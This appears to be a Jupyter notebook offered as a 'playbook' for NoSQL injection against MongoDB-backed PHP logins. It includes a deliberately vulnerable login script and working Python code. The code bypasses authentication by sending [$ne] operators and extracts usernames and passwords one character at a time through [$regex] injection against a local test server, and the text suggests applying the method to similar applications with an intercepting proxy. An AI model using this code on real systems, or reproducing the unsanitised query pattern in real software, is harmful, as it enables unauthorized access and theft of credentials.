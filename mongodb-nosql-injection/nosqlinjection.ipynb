{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "09ddbd64-522d-4858-bf04-00d21fd48467",
   "metadata": {},
   "source": [
    "## MongoDB NoSQL Injection Playbook\n",
    "Welcome to this notebook in which I demonstrate two ways to abuse MongoDB login systems.\n",
    "\n",
    "The code in this notebook is able to bypass authentication and exfiltrate sensitive information (usernames and passwords).\n",
    "\n",
    "## Disclaimer\n",
    "This is for educational purposes only! Do not use it against targets you don't own or are not allowed to use it against! I am not responsible for whatever you do with this.\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "77587db3-fe0d-4046-b315-10c18150c22d",
   "metadata": {},
   "source": [
    "## Preparation\n",
    "I installed MongoDB on my system (operating system doesn't really matter) and added the MongoDB driver to my PHP installation.\n",
    "The easiest way to do this (on Windows) seems to be XAMPP, but feel free to use other methods."
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2d1c168e-4b47-4b31-918b-adcf37ef1c1a",
   "metadata": {},
   "source": [
    "## Login code\n",
    "Here's the - not *that* sophisticated - login system in PHP:\n",
    "```\n",
    "<?php\n",
    "    // should be the same for all default MongoDB installations\n",
    "    $mng = new MongoDB\\Driver\\Manager(\"mongodb://localhost:27017\");\n",
    "    $qry = new MongoDB\\Driver\\Query([]);\n",
    "\n",
    "    if(isset($_POST['login'])) {\n",
    "      $postedUsername = $_POST['username'];\n",
    "      $postedPassword = $_POST['password'];\n",
    "\n",
    "      $filter = ['username' => $postedUsername, 'password' => $postedPassword];\n",
    "      $query = new MongoDB\\Driver\\Query($filter);\n",
    "      $rows = $mng->executeQuery('exploit.users', $query);\n",
    "      $found_user = false;\n",
    "\n",
    "      foreach ($rows as $row) {\n",
    "        $found_user = true;\n",
    "      }\n",
    "    \n",
    "      if($found_user == true) {\n",
    "        echo \"Login succeeded\";\n",
    "      } else {\n",
    "        echo \"Login failed\";\n",
    "      }\n",
    "    } \n",
    "?>\n",
    "```\n",
    "\n",
    "I saved this to `login.php` and put it in my `htdocs` folder: `nosql/login.php`.\n",
    "\n",
    "I then added the following users to the collection `exploit.users`:\n",
    "\n",
    "```\n",
    "[{\n",
    "  \"_id\": {\n",
    "    \"$oid\": \"60e4651a6aa8f5f72049dad6\"\n",
    "  },\n",
    "  \"username\": \"admin\",\n",
    "  \"password\": \"nimda\"\n",
    "},{\n",
    "  \"_id\": {\n",
    "    \"$oid\": \"60e465446aa8f5f72049dad7\"\n",
    "  },\n",
    "  \"username\": \"root\",\n",
    "  \"password\": \"Qald]b!Z_d5Kn\"\n",
    "},{\n",
    "    \"_id\": {\n",
    "     \"$oid\": \"60e5d07b8a81ae580018cbbb\"\n",
    "    },\n",
    "    \"username\":\"third\",\n",
    "    \"password\":\"AB_.#+*[]{}()!$4\"\n",
    "  }\n",
    "]\n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "04062b29-55e3-4f77-82f3-82b5f4ff4902",
   "metadata": {},
   "source": [
    "## Login bypass\n",
    "In order to bypass, we first need to try and authenticate (this will fail, of course).\n",
    "If you don't have requests installed, run `pip install requests` before running this code."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8b790c35-a526-45c2-9acc-306b8e669243",
   "metadata": {},
   "outputs": [],
   "source": [
    "# pip install requests\n",
    "import requests\n",
    "data = {\n",
    "    \"username\": \"steps0x29a\",\n",
    "    \"password\": \"steps0x29a\",\n",
    "    \"login\": \"login\"\n",
    "}\n",
    "x = requests.post('http://localhost/nosql/login.php', data=data, allow_redirects=False)\n",
    "print(x.text)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a4f5c68b-1a52-45b7-bd7a-1c35c77b6314",
   "metadata": {},
   "source": [
    "As you can see, we pass wrong credentials to the login page and receive `Login failed` as a response (as expected).\n",
    "Now, let's bypass the authentication by modifying the input data as below:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b5e121c7-d289-4b5f-aca4-479d4053534e",
   "metadata": {},
   "outputs": [],
   "source": [
    "data = {\n",
    "    \"username[$ne]\": \"steps0x29a\",\n",
    "    \"password[$ne]\": \"steps0x29a\",\n",
    "    \"login\": \"login\"\n",
    "}\n",
    "x = requests.post('http://localhost/nosql/login.php', data=data, allow_redirects=False)\n",
    "print(x.text)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "782a8331-d9f9-4288-9e36-6a0c837bea9b",
   "metadata": {},
   "source": [
    "## What happened here?\n",
    "As you can see we modify the parameters that we pass to the login page by appending `[$ne]` to both of them. \n",
    "That modifier means \"not equal to\" - we are essentially telling MongoDB that it should search for users that are *not* named 'steps0x29a' and *not* have 'steps0x29a' set as their password. And yes, that actually works!\n",
    "\n",
    "## How can this be exploited?\n",
    "You could intercept HTTP requests you make to an application that uses a similar authentication mechanism in your browser and bypass the login, effectively getting access to protected information. burpsuite for example allows on-the-fly modifications of requests and responses. "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4e544af8-0889-4d45-a6d7-690eba25d297",
   "metadata": {},
   "source": [
    "# Leaking information\n",
    "Alright, we now know how to bypass the authentication, let's exfiltrate some data from the database.\n",
    "First, we need a set of characters to try in a bruteforce attack, so let's build it:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a1ab955d-c038-474d-840a-baaba6ce096e",
   "metadata": {},
   "outputs": [],
   "source": [
    "import string\n",
    "import re \n",
    "\n",
    "alphabet = string.printable\n",
    "\n",
    "print(alphabet)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0cd3ace3-eb9d-4ddd-83d6-a8c9c3951bb1",
   "metadata": {},
   "source": [
    "As the attack will rely on regular expressions, we need to escape some of them (that's what `re.escape` is used for). After that, we are ready to go."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dc76d2e8-117c-40da-8128-6239819bfb73",
   "metadata": {},
   "outputs": [],
   "source": [
    "def test_username(username:str) -> bool:\n",
    "  data = { \"username[$regex]\": f\"^{username}$\", \"password[$ne]\":\"steps0x29a\", \"login\": \"login\" } \n",
    "  x = requests.post('http://localhost/nosql/login.php', data, allow_redirects=False)\n",
    "  return \"Login succeeded\" in x.text\n",
    "    \n",
    "def bruteforce_user(seed:str='') -> str:\n",
    "  username = seed\n",
    " \n",
    "  while True:\n",
    "    for a in alphabet:\n",
    "      payload = f\"{username}{re.escape(a)}\"\n",
    "      print(f\"\\r{payload}\", flush=True, end='')\n",
    "      data = { \"username[$regex]\": f\"^{payload}.*$\", \"password[$ne]\":\"steps0x29a\", \"login\": \"login\" } \n",
    "      x = requests.post('http://localhost/nosql/login.php', data, allow_redirects=False)\n",
    "      if \"Login succeeded\" in x.text:\n",
    "        username = f\"{username}{a}\"\n",
    "        if test_username(username):\n",
    "          print()\n",
    "          return username\n",
    "        break\n",
    "  return None \n",
    "\n",
    "print(f'Username found: {bruteforce_user()}')\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "393ba8d5-a0ad-4906-af65-1210310444e5",
   "metadata": {},
   "source": [
    "There's a lot going on here, so let's walk through this step by step.\n",
    "\n",
    "## Bruteforcing a username\n",
    "We start off with an empty username and loop through all the characters in our character set, appending one character to our username at a time. We then send it to the login page, but this time using `[$regex]` as a modifier. This modifier lets us use regex to match things in the database, e.g. usernames. This essentially means that we can ask MongoDB whether there's a username starting with 'a', 'b', ... and so on. As we still use `[$ne]` to bypass the login, the login will succeed when a character is matched.\n",
    "\n",
    "## Verifying usernames\n",
    "As we iterate over the characters inside an endless loop, we need some way of determining whether or not we have found a valid username, not just the beginning of it. That is what `test_username` is for. It uses a slightly different regex to determine whether or not a given username is actually a complete one.\n",
    "\n",
    "## Finding more usernames\n",
    "The problem with this code is that it will find one and only one username (the first match). In order to find another user, we can use the `seed` parameter as follows:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "6880a605-7831-4d1c-99e3-8e431144960e",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(f'Another username: {bruteforce_user(seed=\"r\")}')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "2e5d7a50-c118-4d1a-98e4-fd89bd7938f6",
   "metadata": {},
   "source": [
    "## Getting a user's password\n",
    "Now we know two usernames. Let's get their passwords (it's the same method, so no more explanation required):"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a9b64386-bedd-409f-8f37-9cfa6a69aa46",
   "metadata": {},
   "outputs": [],
   "source": [
    "def test_password(username:str, password:str) -> bool:\n",
    "  data = { \"username[$regex]\": f\"^{username}$\", \"password[$regex]\": f\"^{password}$\", \"login\": \"login\" } \n",
    "  x = requests.post('http://localhost/nosql/login.php', data, allow_redirects=False)\n",
    "  return \"Login succeeded\" in x.text\n",
    "\n",
    "def bruteforce_password(username, seed='') -> str:\n",
    "  password = seed\n",
    " \n",
    "  while True:\n",
    "    for a in alphabet:\n",
    "      payload = f\"{password}{re.escape(a)}\"\n",
    "      print(f\"\\r{payload}\", flush=True, end='')\n",
    "      data = { \"username\": username, \"password[$regex]\":f\"^{payload}\", \"login\": \"login\" } \n",
    "      x = requests.post('http://localhost/nosql/login.php', data, allow_redirects=False)\n",
    "      if \"Login succeeded\" in x.text:\n",
    "        password = f\"{password}{a}\"\n",
    "        if test_password(username, password):\n",
    "          print()\n",
    "          return password\n",
    "        break\n",
    "  return None\n",
    "\n",
    "print(f\"Admin password: {bruteforce_password('admin')}\")\n",
    "print(f\"root password: {bruteforce_password('root')}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "24d68a62-4e3e-4417-8e9e-70dfa5317716",
   "metadata": {},
   "source": [
    "## Issues\n",
    "Special characters are sometimes weird and can lead to false positives or false negatives. Escaping works quite well, but can fail as well. I'll demonstrate with the third user:\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e68e91bf-4672-4b34-9857-dbe1a97e0b84",
   "metadata": {},
   "outputs": [],
   "source": [
    "print(\"AB_.#+*[]{}()!$4\")\n",
    "print(f\"Third user's password: {bruteforce_password('third')}\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "9a12610e-705d-441a-843a-65b006bf552a",
   "metadata": {},
   "source": [
    "As you can see, the result is an endless loop and a false positive password of `AB_.#+++`.\n",
    "The asterisk character as a special character seems to be problematic even when escaping it beforehand. I did not find a solution to this problem as of now.\n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.5"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}